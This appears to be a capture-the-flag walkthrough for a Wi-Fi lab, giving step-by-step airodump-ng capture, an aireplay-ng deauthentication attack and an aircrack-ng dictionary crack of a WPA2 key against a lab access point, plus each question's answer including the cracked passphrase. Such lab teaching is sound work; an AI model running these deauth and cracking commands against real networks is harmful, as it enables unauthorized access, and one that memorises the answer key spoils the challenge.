<h1>Learning Objectives</h1>
<li>Understand what Wi-Fi is.</li>
<li>Explore its importance for an organisation.</li>
<li>Learn the different Wi-Fi attacks.</li>
<li>Learn about the WPA/WPA2 cracking attack.</li>

<p align="center"><img src="https://github.com/user-attachments/assets/e1bd07f4-9f67-4522-ac81-46af0784ddd8"  width="650"/> 

<p align="center">McSkidy took a thoughtful breath. <i>"Mayor can still find his way in!"</i>
<p align="center">Glitch smiles confidently. <i>"I think I know the last technique he relies on to get into the networks."</i>
<p align="center">McSkidy stands up from her chair with a surge of excitement. <i>"Let me guess, it's a notorious way to get into a network - a Wi-Fi attack?!"</i>
<p align="center">Glitch nods decisively. <i>"Exactly! Let's be one step ahead of the Mayor."</i>



<p><h2>Q1: What is the BSSID of our wireless interface?</h2></p>

<details>
  <summary>Q1 Walkthrough</summary>
    <p>Open terminal window and run the command iw dev to display all available wireless devices on the system along with their configurations</p>
      <img src="https://github.com/user-attachments/assets/423bf724-047a-4f08-8dcd-49b17cc110a2"/>

 <details> 
  <summary>Q1 Answer</summary>
   <p><b>02:00:00:00:02:00</b>
    <p><img src="https://github.com/user-attachments/assets/57dee9bf-1d52-4b42-a56c-98abf6779877"/></details>
</details>


<p><h2>Q2: What is the SSID and BSSID of the access point? </h2></p>

<details>
  <summary>Q2 Walkthrough</summary>
    <p>In a terminal, run "sudo iw dev wlan2 scan" to scan for available Wi-Fi networks</p>
      <img src="https://github.com/user-attachments/assets/afe0cac1-0bc0-4796-ad2c-6072354e6051"/>

 <details> 
  <summary>Q2 Answer</summary>
   <p><b>MalwareM_AP, 02:00:00:00:00:00</b>
    <p><img src="https://github.com/user-attachments/assets/a7e1d0d6-3f7c-4c37-aeba-ee42d30ebff8"/>
    <p><img src="https://github.com/user-attachments/assets/1a21ec6e-2b15-46bf-8bfa-764d6d644bc8"/></details>
</details>


<p><h2>Q3: What is the BSSID of the wireless interface that is already connected to the access point?</h2></p>

<details>
  <summary>Q3 Walkthrough</summary>
    <p>In a terminal, run the following commands to disbale your network interace, switch to monitoring mode, and then turn reenable your network interface</p>
      <img src="https://github.com/user-attachments/assets/c072fae1-48bb-41d0-8f4e-b0b6dba45e2c"/>
    <p>Confirm the network interface is in monitoring mode by running "sudo iw dev wlan2 info"</p>
      <img src="https://github.com/user-attachments/assets/5a6401f5-e857-4481-847f-1c693b703625"/>
    <p>Run "sudo airodump-ng wlan2" to capture the Wi-Fi traffic in the area</p>
      <img src="https://github.com/user-attachments/assets/ddaa2698-b28e-400d-8545-cef311f62b00"/>
    <p>Run "sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2" to target the BSSID and network channel of the MalwareM_AP access point and discover any connected devices</p>
      <img src="https://github.com/user-attachments/assets/cd4c2559-321e-464f-8e49-023b923dcd5f"/>
       
 <details> 
  <summary>Q3 Answer</summary>
   <p><b>02:00:00:00:01:00</b>
    <p><img src="https://github.com/user-attachments/assets/48dbc596-4a74-49aa-8067-043ba7398780"/></details>
</details>


<p><h2>Q4: What is the PSK after performing the WPA cracking attack?</h2></p>

<details>
  <summary>Q4 Walkthrough</summary>
    <p>In a seperate terminal, run "sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2" to perform a deauthentication attack on the MalwareM_AP and send 1 deauth to attempt to deauthenticate the connected client</p>
      <img src="https://github.com/user-attachments/assets/19d67504-4254-4cc8-b99d-d21dd823efdc"/>
    <p>Verify the WPA handshake was recorded in the terminal that is capturing traffic on the MalwareM_AP access point</p>
      <img src="https://github.com/user-attachments/assets/bdce2abc-fc41-42b2-953a-0ae75fa18efa"/>
    <p>Run "sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap" to perform a dictionary attack to crack the pre-shared key (PSK) on the MalwareM_AP</p>
      <img src="https://github.com/user-attachments/assets/46df0811-82dc-4604-8e1f-e1340e792a79"/>
       
 <details> 
  <summary>Q4 Answer</summary>
   <p><b>fluffy/champ24</b>
    <p><img src="https://github.com/user-attachments/assets/0d469fb8-892d-482b-a76a-4bbb648cee24"/></details>
</details>
